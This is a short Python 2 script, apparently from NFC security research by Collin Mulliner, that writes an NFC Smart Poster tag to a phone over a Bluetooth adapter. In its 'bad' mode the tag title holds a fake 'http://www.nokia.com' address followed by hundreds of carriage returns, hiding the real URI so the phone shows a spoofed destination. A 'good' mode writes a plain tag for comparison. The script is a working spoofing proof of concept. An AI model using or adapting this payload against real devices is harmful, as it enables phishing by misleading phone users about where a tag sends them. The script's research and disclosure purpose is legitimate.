#!/usr/bin/python

#
# Copyright: Collin Mulliner <collin@mulliner.org>
# Web: http://www.mulliner.org/nfc/
#
# License: GPLv2
#

import NDEFSmartPoster
import NDEFUri
import NDEFTextRecord
import NDEFMessage
import CollinsBtNfcAdapter
import os

if len(os.sys.argv) < 2:
	print "need to provide Bluetooth address of phone running BtNfcAdapter.jar"
	print " pass option \"good\" to generate a the good tag for comparision"
	print "syntax: " + os.sys.argv[0] + " <BDADDR> [good]"
else:
	sp = NDEFSmartPoster.NDEFSmartPoster()
	
	if len(os.sys.argv) == 2:
		# bad
		sp.setUri("http://www.mulliner.org/blog/")
		#sp.setTitle("http://www.nokia.com\r\r\rAddress:\rhttp://www.nokia.com\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r.")
		p = "http://www.nokia.com\r\r\rAddress:\rhttp://www.nokia.com"
		for i in range(0, 502):
			p = p + "\r"
		p = p + "."
		sp.setTitle(p)
	else:
		# good
		sp.setUri("http://www.mulliner.org/blog/")
		sp.setTitle("Collin's Blog")
		
	#print sp.getNDEFMessage().getHex()

	baddr = os.sys.argv[1]
	chan = 25
	na = CollinsBtNfcAdapter.CollinsBtNfcAdapter()
	na.quickWrite(sp.getNDEFMessage().getHex(), baddr, chan)
